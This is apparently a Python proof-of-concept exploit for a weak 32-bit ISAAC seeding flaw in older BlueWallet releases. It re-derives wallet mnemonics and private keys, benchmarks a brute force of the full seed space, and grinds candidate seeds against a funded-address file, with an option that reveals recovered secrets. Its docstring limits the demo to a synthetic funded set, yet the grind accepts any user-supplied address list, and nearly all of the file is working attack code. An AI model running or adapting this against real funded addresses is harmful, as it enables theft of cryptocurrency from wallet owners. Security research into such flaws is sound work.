#!/usr/bin/env python3
"""
BlueWallet <= v3.0.0 ISAAC CREATE — unified lab PoC (Era A).

Reproduces:
  isaac.seed(u32) -> 32x isaac.random() -> double-SHA256(prefix + hex)
  -> BIP39 24-word (HD BIP49) or secp256k1 priv (single-key SegWit-P2SH)

This is a self-contained merge of the original lab script and the audited
`bluewallet_isaac` package: same ergonomics (`--seed`, `--skip-assert`, golden
asserts, per-seed demo), but with no dependency on private `smoking_gun.*`
modules, and validated bit-for-bit against Node `isaac@0.0.5`.

Real-world viability numbers (measured on THIS host):
  # 1) determinism + single-seed demo (default)
  python bw_isaac_poc.py --seed 42

  # 2) feasibility: real throughput + full 2**32 wall-clock extrapolation
  python bw_isaac_poc.py --benchmark --kind segwit_p2sh --bench-seeds 20000

  # 3) end-to-end grind: locate funded seeds in a funded set (real timing/counts)
  #    self-contained synthetic run (generates a funded set, then grinds it):
  python bw_isaac_poc.py --make-synthetic --range 60000 --workers 4 --reveal
  #    or against a funded-address file you supply:
  python bw_isaac_poc.py --funded path/to/funded.txt --end 300000 --workers 8

SCOPE: the grind is demonstrated against a SYNTHETIC, self-owned funded set and
never fetches blockchain data. Deriving the seeds/keys of real third-party
wallets from real funded data is out of scope (see docs/EXPLOIT.md sec. 6.3).
"""

from __future__ import annotations

import argparse
import os
import sys

ROOT = os.path.dirname(os.path.abspath(__file__))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from bluewallet_isaac import (  # noqa: E402
    bluewallet_v3_entropy_hex,
    bluewallet_v3_singlekey_priv,
    create_hd_wallet,
    create_singlekey_wallet,
)
from bluewallet_isaac import attack, grind as grind_mod  # noqa: E402
from tools.make_synthetic_funded_set import build_synthetic_funded_set  # noqa: E402

# Golden vectors (JS isaac@0.0.5 <-> Python parity).
GOLDEN_HD_ENTROPY_1 = "2132c5907cbc79a7787eee988a67ef7342d7e4b4083faba7e1e468c92b4b0aa2"
GOLDEN_LEGACY_PRIV_1 = "f7b794d0944c9fd8c8e1b50433ef38609fd0d46f9bc10badeaaada8fedb30646"
GOLDEN_BIP49_ADDR_1 = "37D7efZUJ5S1BdiS63EKX4nAGbSJ1UpBYQ"
GOLDEN_SEGWIT_P2SH_ADDR_1 = "35mpjXaH4oRMAzSzbMRiNgjwmXtaSVMZA8"
GOLDEN_MNEMONIC_1_PREFIX = "cancel normal goat"


def assert_goldens() -> None:
    hd = create_hd_wallet(1)
    sk = create_singlekey_wallet(1)
    assert bluewallet_v3_entropy_hex(1, "hello there") == GOLDEN_HD_ENTROPY_1
    assert bluewallet_v3_singlekey_priv(1).hex() == GOLDEN_LEGACY_PRIV_1
    assert hd.bip49_address(0) == GOLDEN_BIP49_ADDR_1
    assert hd.mnemonic.startswith(GOLDEN_MNEMONIC_1_PREFIX)
    assert sk.segwit_p2sh_address() == GOLDEN_SEGWIT_P2SH_ADDR_1
    print("[ok] golden vectors seed=1 (JS isaac@0.0.5 parity)")


def demo(seed: int) -> None:
    print(f"=== Era A CREATE PoC  isaac_seed={seed} ===\n")
    hd = create_hd_wallet(seed)
    sk = create_singlekey_wallet(seed)
    print(f"HD entropy (hello there):  {hd.entropy_hex}")
    print(f"Single-key priv (oh hai!): {sk.privkey_hex}\n")

    print("--- UI default: HD SegWit P2SH (BIP49 m/49'/0'/0'/0/0) ---")
    print(f"mnemonic: {hd.mnemonic}")
    print(f"address:  {hd.bip49_address(0)}")
    print(f"privkey:  {hd.bip49_privkey_hex(0)}\n")

    print("--- UI option #2: SegwitP2SH single-key ---")
    print(f"address:  {sk.segwit_p2sh_address()}")
    print(f"privkey:  {sk.privkey_hex}")
    print(f"WIF:      {sk.wif}")


def run_benchmark(kind: str, bench_seeds: int, gaps: int) -> None:
    print(f"=== Feasibility: real throughput on THIS host (kind={kind}) ===\n")
    b = attack.benchmark(kind=kind, seeds=bench_seeds, gaps=gaps)
    backend = "coincurve (native libsecp256k1)" if b.used_coincurve else "ecdsa (pure python)"
    print(f"secp256k1 backend : {backend}")
    print(f"measured          : {b.seeds:,} seeds in {b.seconds:.2f}s = {b.rate:,.0f} seeds/s (1 core)")
    full = b.full_space_seconds()
    print(f"full 2**32 (1 core): {attack.format_duration(full)}  ({full:,.0f}s)")
    for cores in (8, 64, 512):
        print(f"  with {cores:>4} cores : {attack.format_duration(full / cores)}")
    print("\nInterpretation: 2**32 ~= 4.29e9 candidates is offline-tractable at these")
    print("rates; an optimized C/GPU ISAAC + funded-set intersection collapses it")
    print("further (source research cites ~50-100k+ addr/s per host).")


def run_grind(args: argparse.Namespace) -> int:
    expect_planted = args.expect_planted
    if args.make_synthetic:
        out_dir = args.out_dir or os.path.join(ROOT, "data")
        print("=== Generating SYNTHETIC funded set (self-owned; no real data) ===")
        funded_path, truth_path, planted = build_synthetic_funded_set(
            out_dir=out_dir,
            seed_range=args.range,
            planted=args.planted,
            decoys=args.decoys,
            gaps=args.gaps,
            rng_seed=args.rng_seed,
        )
        print(f"planted vulnerable wallets: seeds {planted}")
        print(f"funded set: {funded_path}\n")
        args.funded = funded_path
        expect_planted = truth_path
        if args.end is None:
            args.end = args.range

    funded = grind_mod.load_funded_set(args.funded)
    kinds = tuple(args.kinds.split(","))
    end = args.end if args.end is not None else 300000
    print("=== Full-space grind: intersect ISAAC CREATE space with funded set ===\n")
    print(f"funded set   : {args.funded}  ({len(funded):,} addresses)")
    print(f"seed range   : [{args.start}, {end})")
    print(f"kinds / gaps : {kinds} / {args.gaps}")
    print(f"workers      : {args.workers}\n")

    def progress(next_seed: int, secs: float, nhits: int) -> None:
        rate = next_seed / secs if secs else 0
        sys.stdout.write(f"\r  scanned up to seed={next_seed:>10}  hits={nhits}  rate={rate:,.0f}/s")
        sys.stdout.flush()

    report = grind_mod.grind(
        funded, start=args.start, end=end, kinds=kinds, gaps=args.gaps,
        workers=args.workers, chunk=args.chunk, out_dir=args.out_dir,
        resume=args.resume, progress_cb=progress,
    )
    print()
    print(f"\nREAL NUMBERS (measured on this host):")
    print(f"  scanned {report.scanned:,} seeds in {report.seconds:.2f}s ({report.rate:,.0f} seeds/s)")
    full_extrap = (1 << 32) / report.rate if report.rate else float("inf")
    print(f"  extrapolated full 2**32 at this rate/worker-count: "
          f"{attack.format_duration(full_extrap)}")
    print(f"  funded seeds located: {len(report.hits)}")
    for h in report.hits:
        print(f"    seed={h.seed}  {h.kind}  {h.address}")

    if report.hits and args.reveal:
        print("\n  Reveal (self-owned synthetic hits -> full key compromise):")
        for h in report.hits:
            info = grind_mod.reveal_hit(h.seed, h.kind)
            print(f"    seed={h.seed}  {h.kind}  {h.address}")
            print(f"      secret: {info.get('mnemonic') or info.get('wif')}")

    if expect_planted and os.path.exists(expect_planted):
        import json
        with open(expect_planted, "r", encoding="utf-8") as fh:
            truth = json.load(fh)
        planted = {g["seed"] for g in truth["planted"]}
        found = {h.seed for h in report.hits}
        missing = planted - found
        print(f"\n  planted seeds   : {sorted(planted)}")
        print(f"  located seeds   : {sorted(found)}")
        ok = not missing
        print(f"  RESULT: {'ALL PLANTED FUNDED WALLETS LOCATED' if ok else f'MISSING {sorted(missing)}'}")
        return 0 if ok else 1
    return 0


def main() -> int:
    p = argparse.ArgumentParser(
        description="BlueWallet ISAAC CREATE PoC (unified)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--seed", type=int, default=1, help="isaac.seed value (0..2**32-1)")
    p.add_argument("--skip-assert", action="store_true", help="skip golden-vector asserts")

    p.add_argument("--benchmark", action="store_true", help="measure real throughput + 2**32 cost")
    p.add_argument("--bench-seeds", type=int, default=20000)

    p.add_argument("--funded", default=None, help="funded-address file to grind against")
    p.add_argument("--make-synthetic", action="store_true",
                   help="generate a synthetic funded set, then grind it (real numbers, no real data)")
    p.add_argument("--range", type=int, default=60000, help="synthetic seed range / default grind end")
    p.add_argument("--planted", type=int, default=3)
    p.add_argument("--decoys", type=int, default=40000)
    p.add_argument("--rng-seed", type=int, default=1337)

    p.add_argument("--kind", default=attack.KIND_SEGWIT_P2SH,
                   choices=[attack.KIND_BIP49, attack.KIND_SEGWIT_P2SH, attack.KIND_LEGACY],
                   help="address kind for --benchmark")
    p.add_argument("--kinds", default=f"{attack.KIND_BIP49},{attack.KIND_SEGWIT_P2SH}",
                   help="comma-separated kinds for --funded/--make-synthetic grind")
    p.add_argument("--start", type=int, default=0)
    p.add_argument("--end", type=int, default=None, help="exclusive seed bound (default: --range)")
    p.add_argument("--gaps", type=int, default=1)
    p.add_argument("--workers", type=int, default=1)
    p.add_argument("--chunk", type=int, default=25000)
    p.add_argument("--out-dir", default=None, help="checkpoint/hits dir (enables --resume)")
    p.add_argument("--resume", action="store_true")
    p.add_argument("--reveal", action="store_true", help="reveal keys for hits (self-owned demo only)")
    p.add_argument("--expect-planted", default=None, help="ground-truth JSON to verify located seeds")
    args = p.parse_args()

    if not args.skip_assert:
        assert_goldens()

    if args.make_synthetic or args.funded:
        return run_grind(args)
    if args.benchmark:
        run_benchmark(args.kind, args.bench_seeds, args.gaps)
        return 0

    demo(args.seed & 0xFFFFFFFF)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
